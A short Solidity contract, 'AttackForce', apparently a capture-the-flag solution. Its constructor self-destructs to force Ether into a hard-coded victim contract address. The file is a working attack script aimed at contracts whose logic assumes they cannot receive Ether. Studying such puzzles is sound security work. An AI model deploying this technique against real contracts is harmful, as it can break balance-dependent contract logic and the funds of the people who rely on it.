// SPDX-License-Identifier: MIT
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.4;

contract AttackForce {

    address payable victim = payable(0xEDA6e82A15AbF30Cd372f5a686a04d742ffdE3aB);
    constructor() payable {
        selfdestruct(victim);
    }
}